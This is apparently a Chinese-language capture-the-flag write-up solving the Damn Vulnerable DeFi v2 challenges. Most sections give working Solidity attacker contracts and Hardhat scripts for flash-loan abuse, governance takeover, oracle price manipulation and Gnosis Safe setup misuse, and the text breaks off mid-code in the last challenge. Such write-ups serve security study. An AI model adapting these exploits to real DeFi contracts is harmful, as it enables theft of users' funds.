[{"title":"Damn vulnerable defi v2 wp","url":"/2022/04/16/Damn%20vulnerable%20defi%20v2%20wp/","content":"Damn vulnerable defi v2 wp链接：https://www.damnvulnerabledefi.xyz/\nSetup\ngit clone https://github.com/tinchoabbate/damn-vulnerable-defi.git（克隆存储库）\ncd damn-vulnerable-defi/（进入存储库）\nnpm install -g yarn（当前节点版本全局安装yarn）\nyarn（确保在存储库中运行它以安装依赖项）\n\n使用yarn run challenge-name. 如果挑战成功执行，您就通过了！\n(yarn run challenge-name失败可以尝试)set http_proxy=http://127.0.0.1:7890set https_proxy=http://127.0.0.1:7890\n\nUnstoppable\nThere’s a lending pool with a million DVT tokens in balance, offering flash loans for free.\nIf only there was a way to attack and stop the pool from offering flash loans …\nYou start with 100 DVT tokens in balance.\n\nfunction flashLoan(uint256 borrowAmount) external nonReentrant &#123;        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);        // Ensured by the protocol via the `depositTokens` function        assert(poolBalance == balanceBefore);                damnValuableToken.transfer(msg.sender, borrowAmount);                IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);                uint256 balanceAfter = damnValuableToken.balanceOf(address(this));        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);    &#125;\n\n我们要做的是使 poolBalance == balanceBefore 不成立\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    //await this.token.transfer(this.pool.address, 1, &#123; from: attacker&#125; );    // Make sure we interact with token contract as &quot;attacker&quot;.    this.token.connect(attacker);    // Send 1 token to pool.    this.token.transfer(this.pool.address, 1);&#125;);\n\nNaive receiver\nThere’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\nDrain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)\n\nfunction receiveEther(uint256 fee) public payable &#123;       require(msg.sender == pool, &quot;Sender must be pool&quot;);       uint256 amountToBeRepaid = msg.value + fee;       require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);              _executeActionDuringFlashLoan();              // Return funds to pool       pool.sendValue(amountToBeRepaid);   &#125;   function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;       uint256 balanceBefore = address(this).balance;       require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);       require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);       // Transfer ETH and handle control to receiver       borrower.functionCallWithValue(           abi.encodeWithSignature(               &quot;receiveEther(uint256)&quot;,               FIXED_FEE           ),           borrowAmount       );              require(           address(this).balance &gt;= balanceBefore + FIXED_FEE,           &quot;Flash loan hasn&#x27;t been paid back&quot;       );   &#125;\n\n可以利用receiveEther函数，支付10次手续费，但是要满足 msg.sender == pool\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    this.pool.connect(attacker);    for(let i = 0;i &lt; 10;i ++)&#123;        await this.pool.flashLoan(this.receiver.address,0);    &#125;&#125;);\n\nTruster\nMore and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\nBut don’t worry, you might be able to take them all from the pool. In a single transaction.\n\nfunction flashLoan(       uint256 borrowAmount,       address borrower,       address target,       bytes calldata data   )       external       nonReentrant   &#123;       uint256 balanceBefore = damnValuableToken.balanceOf(address(this));       require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);              damnValuableToken.transfer(borrower, borrowAmount);       target.functionCall(data);       uint256 balanceAfter = damnValuableToken.balanceOf(address(this));       require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);   &#125;\n\n\n使用approve函数批准\n调用flashLoan并利用data\ntransferFrom\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE  */    const data = this.token.interface.encodeFunctionData(&quot;approve&quot;, [attacker.address,TOKENS_IN_POOL.toHexString()],);    await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);&#125;);\n\ninterface.encodeFunctionData 的用法\n\nSide entrance\nA surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool.\n\ninterface IFlashLoanEtherReceiver &#123;    function execute() external payable;&#125;contract SideEntranceLenderPool &#123;    using Address for address payable;    mapping (address =&gt; uint256) private balances;    function deposit() external payable &#123;        balances[msg.sender] += msg.value;    &#125;    function withdraw() external &#123;        uint256 amountToWithdraw = balances[msg.sender];        balances[msg.sender] = 0;        msg.sender.sendValue(amountToWithdraw);    &#125;    function flashLoan(uint256 amount) external &#123;        uint256 balanceBefore = address(this).balance;        require(balanceBefore &gt;= amount, &quot;Not enough ETH in balance&quot;);                IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();        require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);            &#125;&#125; \n\n\n调用flashLoan，中途把钱deposit回池中，使 address(this).balance &gt;= balanceBefore 成立\n取出存款\n\npragma solidity ^0.8.0;import &quot;../side-entrance/SideEntranceLenderPool.sol&quot;;import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;contract SideEntranceAttacker is IFlashLoanEtherReceiver&#123;    using Address for address payable;    SideEntranceLenderPool pool;    function attack(SideEntranceLenderPool _pool) external &#123;        pool = _pool;        pool.flashLoan(address(pool).balance);        pool.withdraw();        payable(msg.sender).sendValue(address(this).balance);    &#125;    function execute() external payable override &#123;        pool.deposit&#123;value:msg.value&#125;();    &#125;    receive() external payable&#123;&#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** YOUR EXPLOIT GOES HERE */    const SideEntranceAttacker = await ethers.getContractFactory(&#x27;SideEntranceAttacker&#x27;,attacker);    const Attack = await SideEntranceAttacker.deploy();    await Attack.attack(this.pool.address);&#125;);\n\nThe rewarder\nThere’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.\nAlice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!\nYou don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.\nOh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?\n\nfunction distributeRewards() public returns (uint256) &#123;    uint256 rewards = 0;    if(isNewRewardsRound()) &#123;        _recordSnapshot();    &#125;                uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);    uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);    if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;        rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;        if(rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;            rewardToken.mint(msg.sender, rewards);            lastRewardTimestamps[msg.sender] = block.timestamp;        &#125;    &#125;    return rewards;     &#125;    function flashLoan(uint256 amount) external nonReentrant &#123;        uint256 balanceBefore = liquidityToken.balanceOf(address(this));        require(amount &lt;= balanceBefore, &quot;Not enough token balance&quot;);        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);                liquidityToken.transfer(msg.sender, amount);        msg.sender.functionCall(            abi.encodeWithSignature(                &quot;receiveFlashLoan(uint256)&quot;,                amount            )        );        require(liquidityToken.balanceOf(address(this)) &gt;= balanceBefore, &quot;Flash loan not paid back&quot;);    &#125;\n\n从 test setup 可以看到攻击开始时，4 个用户在上一轮已经存入了 400 个代币，每人获得了 25 个奖励代币。且我们可以从另一个池中以闪电贷的形式借最多 1000000 个代币。\n而奖励的计算方式是整型，忽略了小数部分，只要我们的投入金额足够大，就会忽略掉其他四个用户的奖励。\npragma solidity ^0.8.0;import &quot;../the-rewarder/FlashLoanerPool.sol&quot;;import &quot;../the-rewarder/TheRewarderPool.sol&quot;;import &quot;../the-rewarder/RewardToken.sol&quot;;import &quot;../the-rewarder/AccountingToken.sol&quot;;contract TheRewarderAttacker &#123;    FlashLoanerPool flashLoanerPool;    DamnValuableToken immutable liquidityToken;    TheRewarderPool theRewarderPool;    RewardToken rewardToken;    constructor(address liquidityTokenAddress, address rewardTokenAddress, FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool) &#123;        liquidityToken = DamnValuableToken(liquidityTokenAddress);        rewardToken = RewardToken(rewardTokenAddress);        theRewarderPool = _theRewarderPool;        flashLoanerPool = _flashLoanerPool;    &#125;    function attack(uint256 amount) external &#123;        flashLoanerPool.flashLoan(amount);        rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));    &#125;    function receiveFlashLoan(uint256 amount) external &#123;        //存入所有闪贷出的token        liquidityToken.approve(address(theRewarderPool),amount);        //rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));        theRewarderPool.deposit(amount);        //分发奖励        //调用deposit函数时会自动调用distributeRewards函数        //theRewarderPool.distributeRewards();        //取出token        theRewarderPool.withdraw(amount);        //归还闪贷        liquidityToken.transfer(address(flashLoanerPool),amount);    &#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]);    const TheRewarderAttacker = await  ethers.getContractFactory(&#x27;TheRewarderAttacker&#x27;,attacker);    const Attacker = await TheRewarderAttacker.deploy(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address);    await Attacker.attack(TOKENS_IN_LENDER_POOL);&#125;);\n\nSelfie\nA new cool lending pool has launched! It’s now offering flash loans of DVT tokens.\nWow, and it even includes a really fancy governance mechanism to control it.\nWhat could go wrong, right ?\nYou start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.\n\nfunction queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;    require(_hasEnoughVotes(msg.sender), &quot;Not enough votes to propose an action&quot;);    require(receiver != address(this), &quot;Cannot queue actions that affect Governance&quot;);                                                                                              uint256 actionId = actionCounter;    GovernanceAction storage actionToQueue = actions[actionId];    actionToQueue.receiver = receiver;    actionToQueue.weiAmount = weiAmount;    actionToQueue.data = data;    actionToQueue.proposedAt = block.timestamp;    actionCounter++;    emit ActionQueued(actionId, msg.sender);    return actionId;&#125;\tfunction flashLoan(uint256 borrowAmount) external nonReentrant &#123;        uint256 balanceBefore = token.balanceOf(address(this));        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);                token.transfer(msg.sender, borrowAmount);                        require(msg.sender.isContract(), &quot;Sender must be a deployed contract&quot;);        msg.sender.functionCall(            abi.encodeWithSignature(                &quot;receiveTokens(address,uint256)&quot;,                address(token),                borrowAmount            )        );                uint256 balanceAfter = token.balanceOf(address(this));        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);    &#125;    function drainAllFunds(address receiver) external onlyGovernance &#123;        uint256 amount = token.balanceOf(address(this));        token.transfer(receiver, amount);                emit FundsDrained(receiver, amount);    &#125;\n\ndrainAllFunds 允许从池中转移所有代币，并受 onlyGovernance 修饰符的保护。\npragma solidity ^0.8.0;import &quot;../selfie/SimpleGovernance.sol&quot;;import &quot;../selfie/SelfiePool.sol&quot;;contract SelfieAttacker &#123;    SimpleGovernance governance;    SelfiePool pool;    address attacker;    uint256 actionId;    constructor(SimpleGovernance _governance,SelfiePool _pool) &#123;        governance = _governance;        pool = _pool;        attacker = msg.sender;    &#125;    function attack1(uint256 amount) external &#123;        pool.flashLoan(amount);    &#125;\t//在等待 2 天后执行它并执行它以耗尽所有令牌    function attack2() external &#123;        governance.executeAction(actionId);    &#125;    function receiveTokens(address _token,uint256 borrowAmount) external &#123;    \t//创建治理代币的快照        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);        token.snapshot();\t\t//排队提案        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);        actionId =governance.queueAction(address(pool),data,0);\t\t//归还贷款        token.transfer(address(pool),borrowAmount);    &#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const SelfieAttacker = await ethers.getContractFactory(&#x27;SelfieAttacker&#x27;,attacker);    const Attack = await SelfieAttacker.deploy(this.governance.address,this.pool.address);    await Attack.attack1(TOKENS_IN_POOL);    await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); // 2 days    await Attack.attack2();&#125;);\n\nCompromised\nWhile poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:\nHTTP/2 200 OKcontent-type: text/htmlcontent-language: envary: Accept-Encodingserver: cloudflare4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 354d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34\n\nA related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each\nThis price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.\nStarting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.\n\nfunction postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;    _setPrice(msg.sender, symbol, newPrice);&#125;    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));        // calculate median price        if (prices.length % 2 == 0) &#123;            uint256 leftPrice = prices[(prices.length / 2) - 1];            uint256 rightPrice = prices[prices.length / 2];            return (leftPrice + rightPrice) / 2;        &#125; else &#123;            return prices[prices.length / 2];        &#125;    &#125;\n\n只有onlyTrustedSource才能修改价格\n当价格的数组的长度为奇数时，它取中间的一个并将其称为中值价格。我们恰好有三个管理员\n分析题目给出的数据\ndata1 = &quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;;hexdata1 = bytes.fromhex(&quot;&quot;.join(data1.split())).decode(&quot;utf-8&quot;)base64data1 = base64.b64decode(hexdata1)print(&#x27;data1&#x27;)print(hexdata1)print(base64data1)data2 = &#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;hexdata2 = bytes.fromhex(&quot;&quot;.join(data2.split())).decode(&quot;utf-8&quot;)base64data2 = base64.b64decode(hexdata2)print(&#x27;data2&#x27;)print(hexdata2)print(base64data2)\n\n得到私钥\ndata1MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5b&#x27;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#x27;data2MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4b&#x27;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#x27;\n\nit(&#x27;Exploit&#x27;, async function () &#123;            /** CODE YOUR EXPLOIT HERE */    let privateKey1 = &quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;;    let privateKey2 = &quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;;    let compromisedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);    let compromisedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);    //修改为最低价    await this.oracle.connect(compromisedOracle1).postPrice(&quot;DVNFT&quot;,1);    await this.oracle.connect(compromisedOracle2).postPrice(&quot;DVNFT&quot;,1);    //买入    await this.exchange.connect(attacker).buyOne(&#123;value:1&#125;);    //修改为最高价    await this.oracle.connect(compromisedOracle1).postPrice(&quot;DVNFT&quot;,EXCHANGE_INITIAL_ETH_BALANCE.add(1));    await this.oracle.connect(compromisedOracle2).postPrice(&quot;DVNFT&quot;,EXCHANGE_INITIAL_ETH_BALANCE.add(1));    //卖出    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);    await this.exchange.connect(attacker).sellOne(0);    //修改为原始价格    await this.oracle.connect(compromisedOracle1).postPrice(&quot;DVNFT&quot;,INITIAL_NFT_PRICE);    await this.oracle.connect(compromisedOracle2).postPrice(&quot;DVNFT&quot;,INITIAL_NFT_PRICE);&#125;);\n\nPuppet\nThere’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.\nThere’s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.\nStarting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.\n\nfunction borrow(uint256 borrowAmount) public payable nonReentrant &#123;        uint256 depositRequired = calculateDepositRequired(borrowAmount);                require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);                if (msg.value &gt; depositRequired) &#123;            payable(msg.sender).sendValue(msg.value - depositRequired);        &#125;        deposits[msg.sender] = deposits[msg.sender] + depositRequired;        // Fails if the pool doesn&#x27;t have enough tokens in liquidity        require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);        emit Borrowed(msg.sender, depositRequired, borrowAmount);    &#125;function _computeOraclePrice() private view returns (uint256) &#123;    // calculates the price of the token in wei according to Uniswap pair    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);&#125;\n\n通过改变 uniswap 交易对中的 ether 和 DVT 的余额，我们可以操纵价格，从而操纵从 PuppetPool 借入代币所需的抵押品数量。我们希望所有 DVT 的以太币抵押品尽可能少，为此我们首先必须引发价格暴跌。为此，我们需要减少 uniswap 对的以太币余额并尽可能增加 DVT 代币余额。\n可以借助UniswapV1Exchange.json中的 tokenToEthSwapInput 函数\n&#123;  &quot;name&quot;: &quot;tokenToEthSwapInput&quot;,  &quot;outputs&quot;: [&#123; &quot;type&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;out&quot; &#125;],  &quot;inputs&quot;: [    &#123; &quot;type&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;tokens_sold&quot; &#125;,    &#123; &quot;type&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;min_eth&quot; &#125;,    &#123; &quot;type&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;deadline&quot; &#125;  ],  &quot;constant&quot;: false,  &quot;payable&quot;: false,  &quot;type&quot;: &quot;function&quot;,  &quot;gas&quot;: 47503&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    await this.token.connect(attacker).approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);    //将自己的DVT换成uniswap池中的ETH(不能换完)    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),1,(await ethers.provider.getBlock(&#x27;latest&#x27;)).timestamp * 2);    const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;value:collateral&#125;);&#125;);\n\nPuppet v2\nThe developers of the last lending pool are saying that they’ve learned the lesson. And just released a new version!\nNow they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.\nYou start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)\n\nfunction _getOracleQuote(uint256 amount) private view returns (uint256) &#123;    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(        _uniswapFactory, address(_weth), address(_token)    );    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);&#125;\n\n攻击逻辑和上一题一样\n两种代币交换方法\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    await this.token.connect(attacker).approve(this.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1, [this.token.address, this.weth.address], attacker.address, ((await ethers.provider.getBlock(&#x27;latest&#x27;)).timestamp * 2));    const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);    // 将ETH转换为 WETH    await this.weth.connect(attacker).deposit(&#123; value: collateral &#125;);    await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);    //借出全部代币    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);&#125;);\n\nFree rider\nA new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.\nA buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.\nYou want to build some rep with this buyer, so you’ve agreed with the plan.\nSadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.\n\nfunction buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;    for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;        _buyOne(tokenIds[i]);    &#125;&#125;function _buyOne(uint256 tokenId) private &#123;           uint256 priceToPay = offers[tokenId];    require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);    require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);    amountOfOffers--;    // transfer from seller to buyer    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);    // pay seller    payable(token.ownerOf(tokenId)).sendValue(priceToPay);    emit NFTBought(msg.sender, tokenId, priceToPay);&#125;    \n\n存在两个问题：\n\n一个交易中使用同一个 msg.value ，我们只要满足 msg.value &gt;= 最高价格即可购买下全部的 NFT\n先转移 NFT 的拥有权再转账，是自己对自己转账\n\n方案：\n\n利用 UniswapV2 Flash Swap 借 15 ETH\n将 6 个 NFT 全部买走，此时攻击者账户中拥有 90 ETH\n将这 6 个 NFT 转移到买方合约中，为攻击者赚取 45 ETH\n归还闪贷\n\n可以参考 Flash Swaps \npragma solidity ^0.8.0;import &quot;../free-rider/FreeRiderBuyer.sol&quot;;import &quot;../free-rider/FreeRiderNFTMarketplace.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;interface IUniswapV2Pair &#123;    // token0 : weth    // token1 : DTV    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;&#125;interface IWETH &#123;    function transfer(address recipient, uint256 amount) external returns (bool);    function deposit() external payable;    function withdraw(uint256 amount) external;    function balanceOf(address) external returns (uint);&#125;contract FreeRiderAttacker &#123;    address uniswapV2Pair;    IWETH immutable weth;    FreeRiderNFTMarketplace freeRiderNFTMarketplace;    address buyer;    DamnValuableNFT NFT;    uint256[] public tokenIds = [0,1,2,3,4,5];    constructor(        address _uniswapV2Pair,        IWETH _weth,        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,        address _buyer,        DamnValuableNFT _NFT    ) &#123;        uniswapV2Pair = _uniswapV2Pair;        weth = _weth;        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;        buyer = _buyer;        NFT = _NFT;    &#125;    function attack(uint256 amount) public &#123;        //闪贷        bytes memory data = &quot;ATTACK&quot;;        IUniswapV2Pair(uniswapV2Pair).swap(amount,0,address(this),data);    &#125;    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public &#123;        //取出闪贷的weth        weth.withdraw(amount0);        //购买6个NFT        freeRiderNFTMarketplace.buyMany&#123;value: address(this).balance&#125;(tokenIds);        //存回池中        weth.deposit&#123;value: address(this).balance&#125;();        //归还闪贷        weth.transfer(uniswapV2Pair, weth.balanceOf(address(this)));        //将NFT转移到买方合约中        for(uint256 i=0 ; i&lt;tokenIds.length ; i++) &#123;            NFT.safeTransferFrom(address(this), buyer, i);        &#125;    &#125;    //实现额外的功能 onERC721Received 来接收 NFT    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) &#123;        return IERC721Receiver.onERC721Received.selector;    &#125;    receive() external payable &#123;&#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const Attacker = await (await ethers.getContractFactory(&#x27;FreeRiderAttacker&#x27;, deployer)).deploy(        this.uniswapPair.address,        this.weth.address,        this.marketplace.address,        this.buyerContract.address,        this.nft.address    );    Attacker.connect(attacker).attack(ethers.utils.parseEther(&quot;15&quot;));&#125;);\n\nBackdoor\nTo incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.\nTo make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.\nCurrently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.\nYour goal is to take all funds from the registry. In a single transaction.\n\nfunction setup(    address[] calldata _owners,    uint256 _threshold,    address to,    bytes calldata data,    address fallbackHandler,    address paymentToken,    uint256 payment,    address payable paymentReceiver) external &#123;    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice    setupOwners(_owners, _threshold);    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);    // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules    setupModules(to, data);    if (payment &gt; 0) &#123;        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)        // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);    &#125;    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);&#125;function setupModules(address to, bytes memory data) internal &#123;    require(modules[SENTINEL_MODULES] == address(0), &quot;GS100&quot;);    modules[SENTINEL_MODULES] = SENTINEL_MODULES;    if (to != address(0))        // Setup has to complete successfully or transaction fails.        require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), &quot;GS000&quot;);&#125;\n\n如何用solidity打造可升级智能合约\n编写可升级的智能合约\n参考题解\n使用 approve 赋予攻击合约先花钱的权利，然后再从钱包中提现\npragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;;import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;contract BackDoorAttacker &#123;    GnosisSafeProxyFactory public factory;    IProxyCreationCallback public callback;    address[] public users;    address public singleton;    address token;    constructor(        address _factory,        address _singleton,        address _callback,        address[] memory _users,        address _token    ) &#123;        factory = GnosisSafeProxyFactory(_factory);        singleton = _singleton;        callback = IProxyCreationCallback(_callback);        users = _users;        token = _token;    &#125;    function approve(address _token,address spender) public &#123;        IERC20(_token).approve(spender,10 ether);    &#125;    function attack() external &#123;        bytes memory data = abi.encodeWithSignature(            &quot;approve(address,address)&quot;,            token,            address(this)        );        for (uint256 i = 0; i &lt; users.length; i++) &#123;            address[] memory owners = new address[](1);            owners[0] = users[i];            bytes memory initializer = abi.encodeWithSignature(                &quot;setup(address[],uint256,address,bytes,address,address,uint256,address)&quot;,                owners,                1,                address(this),                data,                address(0),                address(0),                0,                address(0)            );            GnosisSafeProxy proxy = factory.createProxyWithCallback(                singleton,                initializer,                0,                callback            );            IERC20(token).transferFrom(address(proxy), tx.origin, 10 ether);        &#125;    &#125;&#125;\n\nit(&#x27;Exploit&#x27;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const Attacker = await (await 